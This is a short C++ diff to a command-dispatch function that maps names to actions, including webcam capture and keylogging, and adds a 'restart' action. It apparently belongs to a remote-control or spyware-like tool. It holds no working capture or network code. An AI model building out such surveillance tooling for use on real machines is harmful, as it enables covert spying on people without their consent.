@@ -26,6 +26,8 @@ Action getAction(string name) {
         return ACTION_WEBCAM;
     } else if (name.find("keylog") != string::npos) {
         return ACTION_KEYLOG;
+    } else if (name == "restart"){
+        return ACTION_RESTART;
     }
     return ACTION_INVALID;
 }
